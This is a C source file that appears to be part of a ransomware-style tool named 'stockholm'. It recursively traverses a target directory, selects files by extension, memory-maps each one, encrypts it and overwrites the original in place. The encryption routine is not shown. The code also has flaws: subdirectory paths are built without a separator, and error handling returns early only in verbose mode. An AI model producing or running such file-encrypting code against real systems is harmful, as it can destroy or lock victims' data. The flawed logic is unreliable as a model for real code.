#include "stockholm.h"

bool is_entry_handled(const char *foldername)
{
	char *dir_paths[FA_UNHANDLED_DIRS_ARRAY_SIZE] = FA_UNHANDLED_DIRS;

	for (size_t i = 0; i < FA_UNHANDLED_DIRS_ARRAY_SIZE; ++i)
		if (strcmp(foldername, dir_paths[i]) == 0)
			return false;

	return true;
}

// Function to check if a file is in the created_files list
bool is_created_file(
	char *created_files[], size_t created_file_count, const char *filename)
{
	for (size_t i = 0; i < created_file_count; i++)
	{
		if (strcmp(created_files[i], filename) == 0)
			return true; // File is in the created files list
	}
	return false; // File is not in the created files list
}

void handle_file(const char *filepath)
{
	/* Create a mapping between the target file and the memory region occupied
	 * by the program. This is to facilitate the memory handling to manipulate
	 * the file data.
	 *
	 * Then, process the encryption
	 */

	if (fa_map_file_into_memory(filepath))
		if (g_modes & FA_VERBOSE) {
			perror("An error occurred while attempting to map the file into memory");
			return;
		}

	if (fa_process_mapped_data())
		if (g_modes & FA_VERBOSE) {
			perror("An error occurred while attempting to process the mapped data");
			return;
		}

	// Write the final file data in the target path
	if (fa_write_processed_data_to_file(filepath))
		if (g_modes & FA_VERBOSE)
			perror("An error occurred while attempting to write the mapped data into the file");
}

void handle_dir(char *target_dir_path)
{
	// A list of the created files during the process
	char *created_files[FA_MAX_FILES];
	size_t created_files_count = 0;
	// Pointer to hold directory entry information
	struct dirent *entry;
	// Open the directory stream
	DIR *dir = opendir(target_dir_path);
	if (!dir)
		return;

	// Loop through each entry in the directory
	while ((entry = readdir(dir)) != NULL)
	{
		// Check if the entry name starts with a dot (.)
		// This is to skip the current (.) and parent (..) directory entries
		if (is_entry_handled(entry->d_name))
		{
			// Create a buffer to hold the full path
			char path[1024];
			struct stat statbuf;

			// Use snprintf() to safely concatenate the strings
			snprintf(path, sizeof(path), "%s%s", target_dir_path, entry->d_name);

			// Check if it's a directory
			if (stat(path, &statbuf) == 0 && S_ISDIR(statbuf.st_mode))
			{
				if (g_modes & FA_VERBOSE) printf("[DIR] %s\n", path);

				// Recursive call for subdirectories
				handle_dir(path);
			}
			else
			{
				if (g_modes & FA_VERBOSE) printf("[FILE] %s\n", path);

				if (created_files_count < FA_MAX_FILES &&
					is_extension_handled(path) &&
					!is_created_file(created_files, created_files_count, path))
				{
					handle_file(path);

					// Remember the created file path to avoid handling it twice
					created_files[created_files_count] = strdup(path);
					++created_files_count;
				}
			}
		}
	}

	// Free allocated memory for created files
	for (size_t i = 0; i < created_files_count; ++i)
	{
		free(created_files[i]);
		created_files[i] = NULL;
	}

	// Close the directory stream
	closedir(dir);
}
